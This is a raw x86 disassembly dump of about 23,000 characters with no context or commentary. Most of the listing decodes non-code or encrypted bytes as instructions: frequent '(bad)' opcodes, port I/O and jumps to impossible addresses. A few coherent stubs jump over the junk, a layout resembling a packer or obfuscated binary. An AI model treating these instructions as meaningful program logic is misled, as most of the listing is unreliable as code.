  407cf7:	addr16 sub al,0x9f
  407cfa:	sahf   
  407cfb:	add    BYTE PTR [ebp-0x743e7f32],dh
  407d01:	scas   eax,DWORD PTR es:[edi]
  407d02:	pop    esi
  407d03:	pop    edi
  407d04:	(bad)  
  407d05:	loop   0x407d40
  407d07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d08:	sahf   
  407d09:	fmul   QWORD PTR [edi]
  407d0b:	in     eax,0xd4
  407d0d:	mov    edx,0x3e99e139
  407d12:	mov    bh,0x43
  407d14:	inc    ebx
  407d15:	popa   
  407d16:	daa    
  407d17:	fwait
  407d18:	clc    
  407d19:	loop   0x407d26
  407d1b:	lds    ebp,FWORD PTR [edx+0x1f]
  407d1e:	push   eax
  407d1f:	pop    edi
  407d20:	xchg   esp,eax
  407d21:	idiv   esi
  407d23:	(bad)  
  407d24:	jl     0x407d1c
  407d26:	and    ch,BYTE PTR [edi+0x7e1482c3]
  407d2c:	mov    ebx,0x692e2a60
  407d31:	xchg   esi,eax
  407d32:	or     BYTE PTR [edx-0x2dc1d51a],cl
  407d38:	adc    eax,0xb5879f3
  407d3d:	dec    eax
  407d3e:	cmc    
  407d3f:	xor    eax,0x39a37e09
  407d44:	jmp    0xa67c01fd
  407d49:	mov    cs,WORD PTR [edi+eax*2]
  407d4c:	aaa    
  407d4d:	dec    edi
  407d4e:	xchg   edx,eax
  407d4f:	outs   dx,DWORD PTR ds:[esi]
  407d50:	rol    dl,0xa6
  407d53:	loopne 0x407dc7
  407d55:	mov    esi,0x44ead4c5
  407d5a:	enter  0xdc0f,0xa7
  407d5e:	mov    ax,ds:0x3a27ee45
  407d64:	mov    ecx,0xf3e99d84
  407d69:	xor    cl,BYTE PTR [edi]
  407d6b:	adc    eax,0xa14bae98
  407d70:	jge    0x407d95
  407d72:	stc    
  407d73:	push   edi
  407d74:	cmp    al,0x20
  407d76:	add    eax,0x86e79cb4
  407d7b:	stos   DWORD PTR es:[edi],eax
  407d7c:	cwde   
  407d7d:	in     al,dx
  407d7e:	repnz pop esi
  407d80:	outs   dx,DWORD PTR ds:[esi]
  407d81:	(bad)  
  407d82:	inc    edx
  407d83:	lahf   
  407d84:	adc    BYTE PTR [esi+ecx*1],ah
  407d87:	fist   WORD PTR [esp+eiz*4-0x32bac27c]
  407d8e:	pop    eax
  407d8f:	jg     0x407dc8
  407d91:	xor    DWORD PTR [eax-0x32fd2b4f],ecx
  407d97:	pop    ds
  407d98:	out    0xf,al
  407d9a:	jmp    0x407dcc
  407d9c:	sbb    al,0xfb
  407d9e:	mov    eax,0xaa4e7ccf
  407da3:	pop    ebx
  407da4:	pop    eax
  407da5:	xlat   BYTE PTR ds:[ebx]
  407da6:	lock (bad) 
  407da8:	out    dx,eax
  407da9:	test   bh,al
  407dab:	pop    es
  407dac:	arpl   WORD PTR [eax+0x52],si
  407daf:	sbb    ebp,DWORD PTR [edi-0x3f2cfcce]
  407db5:	mov    ss,WORD PTR [ebx]
  407db7:	cmp    al,0x6d
  407db9:	xchg   DWORD PTR [edi-0x1b05cb4],eax
  407dbf:	dec    ecx
  407dc0:	mov    DWORD PTR [ecx+0x2d],edx
  407dc3:	ret    
  407dc4:	lds    edx,FWORD PTR [ebp-0x33c2fb77]
  407dca:	mov    ebp,DWORD PTR [ecx+eax*4-0x538b67c2]
  407dd1:	mov    ebx,0x50f87ab9
  407dd6:	(bad)
  407dda:	loopne 0x407e31
  407ddc:	(bad)  
  407dde:	data16 in al,0x7d
  407de1:	inc    eax
  407de2:	(bad)  
  407de3:	mov    ebp,0xdd2cfb94
  407de8:	ins    DWORD PTR es:[edi],dx
  407de9:	scas   al,BYTE PTR es:[edi]
  407dea:	gs sub ch,bh
  407ded:	fsubr  DWORD PTR [ebp-0x60]
  407df0:	mov    ebx,0xb77b9f98
  407df5:	jg     0x407e06
  407df7:	sub    eax,0xc97cdde3
  407dfc:	dec    edx
  407dfd:	ja     0x407dbb
  407dff:	in     eax,0x4a
  407e01:	or     al,BYTE PTR ds:0xbfda4b96
  407e07:	sub    eax,0x57094e9f
  407e0c:	je     0x407e37
  407e0e:	push   ss
  407e0f:	into   
  407e10:	jo     0x407db1
  407e12:	jp     0x407e63
  407e14:	adc    eax,DWORD PTR [ecx+0x34]
  407e17:	xor    bh,BYTE PTR [edi]
  407e19:	jmp    0xb9bc:0xc311be12
  407e20:	lahf   
  407e21:	enter  0xb6e6,0x5f
  407e25:	adc    BYTE PTR [ebp-0x33aabd3],ah
  407e2b:	add    eax,0x5ec15eb0
  407e30:	pop    ecx
  407e31:	add    eax,0x60d6f8ae
  407e36:	rol    DWORD PTR [ebx-0x5de7b05],cl
  407e3c:	add    eax,0x608cc489
  407e41:	sbb    eax,DWORD PTR [bp-0x62]
  407e45:	jmp    0x407def
  407e47:	in     al,dx
  407e48:	cwde   
  407e49:	lds    edi,FWORD PTR [ecx+0x52b918b7]
  407e4f:	mov    edi,0x969644f7
  407e54:	stos   DWORD PTR es:[edi],eax
  407e55:	jp     0x407e06
  407e57:	call   0xa7b8c37a
  407e5c:	mov    bl,dh
  407e5e:	sbb    bh,BYTE PTR [ebp+0x4f]
  407e61:	fst    DWORD PTR [edx+0x595e59b9]
  407e67:	mov    ebp,0x154ab063
  407e6c:	push   ss
  407e6d:	cld    
  407e6e:	sar    ch,cl
  407e70:	inc    BYTE PTR [edx-0x78f0d625]
  407e76:	or     BYTE PTR [eax],al
  407e78:	add    BYTE PTR [eax],al
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	jg     0x407f10
  407e9f:	ror    eax,1
  407ea1:	adc    ebp,ecx
  407ea3:	jle    0x407f23
  407ea5:	mov    bh,BYTE PTR [edi+0x7e]
  407ea8:	jle    0x407e5a
  407eaa:	jae    0x407f0d
  407eac:	or     dh,BYTE PTR [esp+ebx*4-0x4]
  407eb0:	or     edi,ebx
  407eb2:	or     al,BYTE PTR [edi+edx*8+0x35]
  407eb6:	stos   DWORD PTR es:[edi],eax
  407eb7:	sti    
  407eb8:	and    bh,al
  407eba:	or     DWORD PTR [ebx+ebp*2-0x41],ecx
  407ebe:	xlat   BYTE PTR ds:[ebx]
  407ebf:	jns    0x407e81
  407ec1:	inc    edx
  407ec2:	mov    eax,0x1583aeb9
  407ec7:	cmp    DWORD PTR [edx+0x10014434],0x276760b2
  407ed1:	sti    
  407ed2:	xchg   edx,eax
  407ed3:	sahf   
  407ed4:	sub    BYTE PTR [esi-0x35],0x95
  407ed8:	scas   al,BYTE PTR es:[edi]
  407ed9:	dec    edx
  407eda:	(bad)  
  407edb:	nop
  407edc:	jp     0x407ef1
  407ede:	cmc    
  407edf:	stc    
  407ee0:	adc    ebx,DWORD PTR [edi+0x52c8e3d1]
  407ee6:	push   cs
  407ee7:	mov    al,0x99
  407ee9:	jnp    0x407f55
  407eeb:	mov    esi,0xe89a9f5d
  407ef0:	xchg   DWORD PTR [esi-0x78],ebp
  407ef3:	mov    dl,ch
  407ef5:	fistp  WORD PTR [ebx+0x4225ed68]
  407efb:	sti    
  407efc:	xlat   BYTE PTR ds:[ebx]
  407efd:	mov    bh,0x8f
  407eff:	push   ecx
  407f00:	(bad)  
  407f01:	in     eax,dx
  407f02:	push   es
  407f03:	add    BYTE PTR [edx-0x76e5e70e],dl
  407f09:	mov    ah,0x61
  407f0b:	add    BYTE PTR [eax+ecx*1],0x8e
  407f0f:	cli    
  407f10:	mov    ah,0xbc
  407f12:	mov    eax,ds:0xc791876e
  407f17:	adc    dh,BYTE PTR [edx-0x7c]
  407f1a:	adc    BYTE PTR [ebx+0x436a5064],bl
  407f20:	(bad)  
  407f21:	sahf   
  407f22:	mov    bl,0x39
  407f24:	cdq    
  407f25:	add    ebp,DWORD PTR [ebp-0xdc10c56]
  407f2b:	mov    dh,BYTE PTR [ecx-0x73dfea82]
  407f31:	imul   ecx,DWORD PTR [esi-0x16],0x3d5c86ca
  407f38:	pop    ebp
  407f39:	arpl   WORD PTR [edi-0x62],di
  407f3c:	xchg   esp,eax
  407f3d:	dec    esp
  407f3e:	mov    al,ds:0x45bc08ec
  407f43:	out    0xad,al
  407f45:	ins    DWORD PTR es:[edi],dx
  407f46:	shl    bh,0x1e
  407f49:	jle    0x407fbb
  407f4b:	mov    al,ds:0xd58cbbff
  407f50:	mov    dl,0xf3
  407f52:	jmp    FWORD PTR [ebp+0x52de1a9e]
  407f58:	jo     0x407f7e
  407f5a:	in     eax,dx
  407f5b:	imul   ecx,ebp,0x1f
  407f5e:	out    0x12,eax
  407f60:	icebp  
  407f61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f62:	js     0x407f61
  407f64:	popf   
  407f65:	add    ch,bl
  407f67:	jecxz  0x407fa1
  407f69:	mov    ds:0x796ed1e,eax
  407f6e:	jp     0x407f6b
  407f70:	dec    edi
  407f71:	push   edx
  407f72:	xchg   edi,eax
  407f73:	ret    
  407f74:	adc    ch,BYTE PTR [eax+0x3b]
  407f77:	mov    ebp,0x5448d515
  407f7c:	ss push esp
  407f7e:	sub    BYTE PTR [ebp-0x1e],bh
  407f81:	icebp  
  407f82:	cmp    eax,0xab62dd21
  407f87:	retf   
  407f88:	iret   
  407f89:	push   ecx
  407f8a:	imul   ebp,DWORD PTR [ebp-0x554719d4],0x9b19741
  407f94:	sahf   
  407f95:	mov    ah,al
  407f97:	lea    esp,[esi]
  407f99:	add    BYTE PTR [ebp-0x4ac6a4f9],0x6
  407fa0:	fwait
  407fa1:	dec    esi
  407fa2:	pop    edi
  407fa3:	icebp  
  407fa4:	sub    esi,DWORD PTR [eax-0x6b]
  407fa7:	mov    ecx,0x9306857c
  407fac:	or     al,0x91
  407fae:	pop    eax
  407faf:	arpl   WORD PTR [edx+0x4983c850],dx
  407fb5:	data16 or al,0x1f
  407fb8:	rcr    DWORD PTR es:[eax+0x18],cl
  407fbc:	add    eax,0xf6ad2cdb
  407fc1:	ins    DWORD PTR es:[edi],dx
  407fc2:	ror    DWORD PTR [esi-0x135b6c34],0xb6
  407fc9:	arpl   WORD PTR [edi-0x63],ax
  407fcc:	mov    ds:0xc393608e,eax
  407fd1:	(bad)  
  407fd3:	cmc    
  407fd4:	adc    esp,ecx
  407fd6:	cmp    al,0x84
  407fd8:	ret    0xbd49
  407fdb:	jl     0x407ffa
  407fdd:	call   0xd2a710a3
  407fe2:	cmp    al,0x23
  407fe4:	mov    bl,0xb1
  407fe6:	std    
  407fe7:	inc    ebp
  407fe8:	mov    dh,0xba
  407fea:	xlat   BYTE PTR ds:[ebx]
  407feb:	iret   
  407fec:	(bad)  ds:0x9493966a
  407ff2:	sub    ebp,ecx
  407ff4:	daa    
  407ff5:	out    0xd3,eax
  407ff7:	ja     0x408004
  407ff9:	daa    
  407ffa:	xchg   edi,eax
  407ffb:	gs jmp 0x407f7f
  407ffe:	jle    0x407ff3
  408000:	fwait
  408001:	sahf   
  408002:	xor    DWORD PTR [eax-0x39],edi
  408005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408006:	fsubr  st(4),st
  408008:	das    
  408009:	pop    eax
  40800a:	cmp    ah,BYTE PTR [edx-0x61c4b3dd]
  408010:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408011:	add    al,0xbd
  408013:	ret    
  408014:	push   esp
  408015:	addr16 pop ebp
  408017:	push   edx
  408018:	adc    eax,0xcca89b36
  40801d:	adc    dl,BYTE PTR [eax-0x662aa867]
  408023:	and    eax,0x3ff46526
  408028:	popf   
  408029:	mov    al,0x7d
  40802b:	inc    BYTE PTR [ebx-0x59]
  40802e:	test   DWORD PTR ds:0x41146d61,esi
  408034:	dec    edi
  408035:	push   ecx
  408036:	xchg   edx,eax
  408037:	sti    
  408038:	jo     0x407fc0
  40803a:	dec    edx
  40803b:	ret    
  40803c:	fadd   QWORD PTR [ebx]
  40803e:	stc    
  40803f:	add    edx,ecx
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	pop    ecx
  40807a:	imul   esp,DWORD PTR [ebp+0x7ecaadb8],0x7e7f8a7e
  408084:	jle    0x40802c
  408086:	sub    al,0xd7
  408088:	mov    cs,WORD PTR [eax]
  40808a:	imul   ebp,DWORD PTR [esi+0xe],0x7e
  40808e:	add    DWORD PTR [edx+edi*1-0x71e9b8ad],ebp
  408095:	fs out dx,al
  408097:	or     ecx,DWORD PTR [esi]
  408099:	dec    ebp
  40809a:	pop    esi
  40809b:	mov    eax,ds:0x663e68c3
  4080a0:	js     0x40809b
  4080a2:	retf   0xb3db
  4080a5:	pop    ss
  4080a6:	call   0x82ae:0xf876d724
  4080ad:	inc    ecx
  4080ae:	jmp    0x1eb77f96
  4080b3:	push   ss
  4080b4:	scas   al,BYTE PTR es:[edi]
  4080b5:	and    BYTE PTR [esi+0x3f6efffe],dh
  4080bb:	add    BYTE PTR [edx],0x85
  4080be:	add    al,0xf6
  4080c0:	fdivr  DWORD PTR [ebx-0x37]
  4080c3:	or     DWORD PTR [ecx],esi
  4080c5:	das    
  4080c6:	int    0xfe
  4080c8:	jg     0x408141
  4080ca:	pop    eax
  4080cb:	test   DWORD PTR [edi],esp
  4080cd:	mov    edi,0xa572070c
  4080d2:	inc    ebp
  4080d3:	(bad)  
  4080d6:	sbb    DWORD PTR [ecx+0x65],ebp
  4080d9:	out    0x81,eax
  4080db:	mov    dh,0xff
  4080dd:	mov    DWORD PTR [edx-0x78],0xb5aa9d40
  4080e4:	mov    eax,ds:0x7c532e07
  4080e9:	cld    
  4080ea:	stc    
  4080eb:	inc    edx
  4080ec:	cmc    
  4080ed:	adc    cl,BYTE PTR [edi]
  4080ef:	bnd jne 0x4080c3
  4080f2:	cdq    
  4080f3:	test   ebp,ecx
  4080f5:	pop    esi
  4080f6:	call   0xad5521c6
  4080fb:	push   ebx
  4080fc:	cmp    esp,0x9fcf22be
  408102:	xchg   edi,eax
  408103:	mov    cs:0x5a1f84d9,eax
  408109:	nop
  40810a:	add    esp,0x78
  40810d:	mov    eax,ds:0xf3e164ef
  408112:	and    DWORD PTR [ebx+0x736c1d36],eax
  408118:	iret   
  408119:	and    dh,BYTE PTR [esi]
  40811b:	aaa    
  40811c:	pop    edx
  40811d:	xchg   edi,eax
  40811e:	(bad)  
  408120:	pop    edx
  408121:	fs xor al,0x48
  408124:	adc    DWORD PTR [edi],ecx
  408126:	int3   
  408127:	call   0x64f6:0xbf10aa10
  40812e:	pop    ecx
  40812f:	(bad)  
  408130:	in     al,0x61
  408132:	bound  esi,QWORD PTR [ebx+0x682f53ed]
  408138:	or     DWORD PTR [ebx],esi
  40813a:	cdq    
  40813b:	imul   edx,DWORD PTR [edi+0x360a4208],0x2
  408142:	js     0x4081a6
  408144:	dec    ebx
  408145:	shl    DWORD PTR [eax],0xc1
  408148:	add    BYTE PTR [ebp+0x5d],dl
  40814b:	shl    dh,1
  40814d:	dec    edx
  40814e:	fcom   QWORD PTR [ebx-0x615c1c10]
  408154:	jb     0x408190
  408156:	js     0x4080e7
  408158:	hlt    
  408159:	jb     0x4081cd
  40815b:	push   eax
  40815c:	test   DWORD PTR [edx-0x11663759],edx
  408162:	cmp    eax,DWORD PTR [di]
  408165:	and    bh,BYTE PTR [edx+eax*8]
  408168:	mov    esi,0xe59d4d3f
  40816d:	sub    esp,ebx
  40816f:	mov    bl,0x50
  408171:	jnp    0x408123
  408173:	int3   
  408174:	and    esp,DWORD PTR [ecx]
  408176:	or     eax,0xadb0fd71
  40817b:	mov    edx,0xc13d5067
  408180:	(bad)  [edx-0x35]
  408183:	xchg   edx,eax
  408184:	lock jno 0x40812c
  408187:	pusha  
  408188:	mov    ah,0xb8
  40818a:	cwde   
  40818b:	in     al,dx
  40818c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40818d:	jmp    0x4081c1
  40818f:	cmp    ecx,DWORD PTR [ebp+0xb76a74d]
  408195:	and    al,0xd
  408197:	mov    ?,WORD PTR [ebx+0x1c]
  40819a:	inc    edi
  40819b:	shl    BYTE PTR [edi],0x9d
  40819e:	lods   eax,DWORD PTR ds:[esi]
  40819f:	mov    ds,WORD PTR [esp+eiz*2-0x3a]
  4081a3:	mov    bh,0x61
  4081a5:	cmp    esi,eax
  4081a7:	shl    BYTE PTR [ebp+0x8742ecd],1
  4081ad:	add    BYTE PTR [esi],cl
  4081af:	sbb    ecx,ebx
  4081b1:	jbe    0x408165
  4081b3:	add    dh,BYTE PTR [ecx]
  4081b5:	out    0x6,eax
  4081b7:	test   eax,0xe14eafe3
  4081bc:	xor    DWORD PTR [ecx-0x31],esi
  4081bf:	xlat   BYTE PTR ds:[ebx]
  4081c1:	ret    0xa2fd
  4081c4:	test   BYTE PTR [ebx],0x59
  4081c7:	ret    
  4081c8:	mov    edx,0xc81f94c1
  4081cd:	pop    ecx
  4081ce:	js     0x408222
  4081d0:	cmp    eax,0x776404f0
  4081d5:	sbb    al,BYTE PTR [esi-0x41]
  4081d8:	pop    ds
  4081d9:	loopne 0x4081e1
  4081db:	push   esi
  4081dd:	push   ebp
  4081de:	xlat   BYTE PTR ds:[ebx]
  4081df:	or     ah,BYTE PTR [eax]
  4081e1:	and    eax,0x41aa5fdb
  4081e6:	in     eax,dx
  4081e7:	push   ebp
  4081e8:	ins    DWORD PTR es:[edi],dx
  4081e9:	outs   dx,BYTE PTR ds:[esi]
  4081ea:	jb     0x4081d2
  4081ec:	xchg   edx,eax
  4081ed:	xchg   ebx,eax
  4081ee:	jg     0x40826c
  4081f0:	(bad)  
  4081f1:	enter  0x21ac,0x2f
  4081f5:	retf   0x8af8
  4081f8:	jno    0x408261
  4081fa:	and    eax,0xd68730e7
  4081ff:	mov    eax,ds:0x2c1220bc
  408204:	sbb    edx,edi
  408206:	cmp    BYTE PTR [ecx-0x72de9ce0],dl
  40820c:	loopne 0x40827b
  40820e:	loope  0x4081ea
  408210:	fsubp  st(6),st
  408212:	or     eax,0x7e7c6676
  408217:	retf   0x385
  40821a:	shr    ecx,1
  40821c:	lods   al,BYTE PTR ds:[esi]
  40821d:	add    DWORD PTR [eax],eax
  40821f:	add    BYTE PTR [eax+edx*1+0x3f],cl
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x394d:0xff25dc62
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x40825d
  408239:	inc    edx
  40823a:	mov    bh,0xfa
  40823c:	mov    ebp,0x7901d55e
  408241:	jns    0x408235
  408243:	or     ah,0x6f
  408246:	and    esi,DWORD PTR [eax+0x162be9f2]
  40824c:	jo     0x4082b9
  40824e:	shr    BYTE PTR ds:0xa0a861f0,1
  408254:	aad    0x68
  408256:	mov    ebp,0xad72e586
  40825b:	es pop ss
  40825d:	xor    al,0x66
  40825f:	sbb    BYTE PTR [ebx+0x2d],ch
  408262:	pusha  
  408263:	jmp    DWORD PTR [edi]
  408265:	sub    ch,BYTE PTR [ebx]
  408267:	loope  0x4082a2
  408269:	into   
  40826a:	pop    eax
  40826b:	div    DWORD PTR [edi+0x7f]
  40826e:	jl     0x408225
  408270:	data16 add BYTE PTR [edx+0x54],cl
  408274:	inc    ebx
  408275:	mov    bh,0xc0
  408277:	mov    WORD PTR [eax+0x14a9e61d],gs
  40827d:	mov    esp,?
  40827f:	ins    BYTE PTR es:[edi],dx
  408280:	dec    ebp
  408281:	call   FWORD PTR ds:0xd5834c38
  408287:	fs je  0x40821d
  40828a:	fcom   DWORD PTR [edi-0x4224ca34]
  408290:	inc    edx
  408291:	xor    ah,ch
  408293:	mov    DWORD PTR [edx-0x9dcbc94],ecx
  408299:	or     eax,0xabc5695e
  40829e:	cmp    al,0xed
  4082a0:	cld    
  4082a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082a2:	dec    edi
  4082a3:	jg     0x408310
  4082a5:	test   BYTE PTR [edi+0x3d],ch
  4082a8:	adc    eax,0xde110992
  4082ad:	pop    esi
  4082ae:	das    
  4082af:	imul   ecx,DWORD PTR [edi+ebp*1-0x4a0fb272],0xffffffe0
  4082b7:	repnz sti 
  4082b9:	retf   0xd1ec
  4082bc:	mov    dh,0x7
  4082be:	aaa    
  4082bf:	out    0xb6,al
  4082c1:	gs ins BYTE PTR es:[edi],dx
  4082c3:	pop    esp
  4082c4:	call   0x4347db2d
  4082c9:	dec    eax
  4082ca:	jge    0x408265
  4082cc:	pop    eax
  4082cd:	outs   dx,BYTE PTR ds:[esi]
  4082ce:	cwde   
  4082cf:	push   esi
  4082d0:	sub    ecx,DWORD PTR ds:0x49a38747
  4082d6:	loop   0x408357
  4082d8:	pop    ebp
  4082d9:	sbb    ecx,0x41494c59
  4082df:	out    dx,al
  4082e0:	call   0x157e:0x3dff89e1
  4082e7:	dec    esi
  4082e8:	adc    ebx,ecx
  4082ea:	sbb    eax,0x18832af
  4082ef:	fs jge 0x40830a
  4082f2:	jae    0x4082fb
  4082f4:	mov    ecx,0x3d900436
  4082f9:	in     eax,0x7b
  4082fb:	mov    BYTE PTR [edi+ebp*8],al
  4082fe:	pop    esi
  4082ff:	push   ebp
  408300:	pop    edx
  408301:	(bad)  {k2}
  408306:	push   ebx
  408307:	out    dx,eax
  408308:	xlat   BYTE PTR ds:[ebx]
  408309:	adc    BYTE PTR [ebp+0x27],cl
  40830c:	hlt    
  40830d:	out    0xd9,eax
  40830f:	shr    BYTE PTR [eax],cl
  408311:	pusha  
  408312:	outs   dx,BYTE PTR ds:[esi]
  408313:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408314:	jb     0x408332
  408316:	add    ebp,DWORD PTR [ecx-0x161943d8]
  40831c:	pusha  
  40831d:	cmp    edi,DWORD PTR [edx+0x10ba461b]
  408323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408324:	mov    DWORD PTR [esp+ecx*8],ebx
  408327:	sub    al,0xa2
  408329:	cmp    BYTE PTR ds:0x96c931ef,ch
  40832f:	and    al,0xe4
  408331:	(bad)
  408336:	sbb    ebp,DWORD PTR [ebp-0x5b7eacad]
  40833c:	mov    ds:0xc8ed4698,al
  408341:	xchg   ebp,eax
  408342:	scas   al,BYTE PTR es:[edi]
  408343:	xchg   ebp,eax
  408344:	pop    ss
  408345:	jnp    0x40838d
  408347:	iret   
  408348:	add    eax,0x55225fdd
  40834d:	or     eax,0x37980390
  408352:	stos   DWORD PTR es:[edi],eax
  408353:	imul   ebp,DWORD PTR [edx-0x2a59a4e1],0xffffffa6
  40835a:	mov    esi,eax
  40835c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40835d:	(bad)  
  40835f:	pop    edi
  408360:	push   0xed7a4b95
  408365:	jecxz  0x408399
  408367:	mov    ch,0x2d
  408369:	retf   0xa1af
  40836c:	sbb    edi,DWORD PTR [ebx+0x4f5faf93]
  408372:	dec    ebp
  408373:	mov    edx,0x66df33d5
  408378:	mov    al,ds:0xec062154
  40837d:	fbld   TBYTE PTR [eax-0x391f3284]
  408383:	mov    eax,ds:0xcffdc8da
  408388:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408389:	data16 adc ch,dh
  40838c:	pop    ecx
  40838d:	cdq    
  40838e:	pop    eax
  40838f:	(bad)  
  408390:	dec    BYTE PTR [edx-0x59]
  408393:	imul   esi,DWORD PTR [ecx-0x41e1ea9e],0x11
  40839a:	lods   eax,DWORD PTR ds:[esi]
  40839b:	pop    ebp
  40839c:	lods   al,BYTE PTR ds:[esi]
  40839d:	jge    0x4083de
  40839f:	xchg   edi,eax
  4083a0:	dec    ebp
  4083a1:	out    dx,al
  4083a2:	test   DWORD PTR [esi+edx*2+0x13],ebx
  4083a6:	mov    al,ds:0xfd785a7d
  4083ab:	mov    eax,ds:0xf147ca49
  4083b0:	(bad)  
  4083b2:	xchg   esp,eax
  4083b3:	es pop ebp
  4083b5:	(bad)  
  4083b8:	add    eax,0xf6ddace0
  4083bd:	mov    BYTE PTR [edi+0x6e],dl
  4083c0:	lods   al,BYTE PTR ds:[esi]
  4083c1:	sub    eax,0xe650ebea
  4083c6:	fsub   st,st(4)
  4083c8:	stc    
  4083c9:	adc    al,0x36
  4083cb:	push   ss
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083e9:	mov    eax,0xc955158b
  4083ee:	jle    0x40846e
  4083f0:	mov    bh,BYTE PTR [edi+0x7e]
  4083f3:	jle    0x408416
  4083f5:	ja     0x4083b3
  4083f7:	inc    edi
  4083f8:	outs   dx,BYTE PTR ds:[esi]
  4083f9:	pushf  
  4083fa:	test   bl,ah
  4083fc:	sub    BYTE PTR [eax+eiz*2-0x5b],0xb3
  408401:	pop    ebx
  408402:	jmp    0x1aa6:0xc10ba33f
  408409:	sbb    ebp,DWORD PTR [esi]
  40840b:	mov    al,ss:0x65cd97f9
  408411:	clc    
  408412:	dec    esp
  408413:	sbb    al,0xd8
  408415:	adc    DWORD PTR [esi-0x5aea0c8e],ecx
  40841b:	push   ecx
  40841c:	fisttp QWORD PTR [edx+0x0]
  40841f:	lds    edx,FWORD PTR [ebp-0x72c09771]
  408425:	lahf   
  408426:	and    DWORD PTR [edx-0x4a],eax
  408429:	pusha  
  40842a:	xor    DWORD PTR [eax],ecx
  40842c:	xchg   edx,eax
  40842d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40842e:	sub    DWORD PTR [eax+0x7f],ecx
  408431:	add    eax,0x80862ca0
  408436:	rcl    DWORD PTR [ebp+0x58],1
  408439:	aaa    
  40843a:	loop   0x408428
  40843c:	sti    
  40843d:	scas   eax,DWORD PTR es:[edi]
  40843e:	jmp    0xac08bd42
  408443:	out    dx,eax
  408444:	inc    edi
  408445:	cs xchg edi,eax
  408447:	sbb    BYTE PTR [edx*4-0x240dd5d5],bh
  40844e:	jl     0x408474
  408450:	push   ebp
  408451:	add    al,ah
  408453:	cmp    eax,0xacec7e5
  408458:	hlt    
  408459:	sbb    dl,BYTE PTR [edx+0x63]
  40845c:	ror    dh,cl
  40845e:	imul   ebx,DWORD PTR [edx],0xace2a942
  408464:	dec    esi
  408465:	(bad)  ds:0x51367ff8
  40846b:	out    dx,al
  40846c:	cld    
  40846d:	pop    ds
  40846e:	jbe    0x40846d
  408470:	fadd   QWORD PTR [edx-0x31]
  408473:	out    0xbc,eax
  408475:	sub    al,0xb6
  408477:	retf   
  408478:	jmp    0x59a20609
  40847d:	xor    eax,0xbbfb737a
  408482:	cmp    ch,BYTE PTR [esi-0x6e]
  408485:	sbb    BYTE PTR [ebx],bh
  408487:	test   eax,0x73862d5d
  40848c:	je     0x408437
  40848e:	add    BYTE PTR [edx-0xe746673],dl
  408494:	in     eax,dx
  408495:	add    BYTE PTR [ebx-0x35],dl
  408498:	push   esp
  408499:	xchg   esi,eax
  40849a:	mov    ds:0x281b74eb,al
  40849f:	jns    0x408468
  4084a1:	mov    ds:0x51fc994e,eax
  4084a6:	mov    eax,ds:0xa3573d94
  4084ab:	inc    ecx
  4084ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4084ad:	xor    DWORD PTR [edx+0x57],eax
  4084b0:	ds push edi
  4084b2:	ins    DWORD PTR es:[edi],dx
  4084b3:	adc    eax,0xd6a9a858
  4084b8:	lods   eax,DWORD PTR ds:[esi]
  4084b9:	xchg   esi,eax
  4084ba:	ret    0xbfe7
  4084bd:	sbb    ebp,DWORD PTR [ecx]
  4084bf:	mov    al,ds:0x2ab63937
  4084c4:	dec    edx
  4084c5:	lahf   
  4084c6:	sub    eax,0x5aabf7db
  4084cb:	sub    esi,edx
  4084cd:	test   eax,0x679ea028
  4084d2:	test   DWORD PTR [esi+0x213d39b7],eax
  4084d8:	call   0x33e74086
  4084dd:	add    dh,BYTE PTR [eax-0x7e]
  4084e0:	clc    
  4084e1:	jmp    0x91ac:0x9a4fab76
  4084e8:	stc    
  4084e9:	cmp    ecx,DWORD PTR ds:0xa593e936
  4084ef:	push   ebp
  4084f0:	jb     0x4084ef
  4084f2:	xchg   ebx,eax
  4084f3:	jecxz  0x408475
  4084f5:	ret    
  4084f6:	shr    DWORD PTR [esi+0x62],cl
  4084f9:	ja     0x67bd4cb4
  4084ff:	jnp    0x408523
  408501:	xchg   esi,eax
  408502:	(bad)  
  408503:	retf   0xdbd3
  408506:	dec    eax
  408507:	js     0x40855c
  408509:	mov    dl,0xd8
  40850b:	loopne 0x40855a
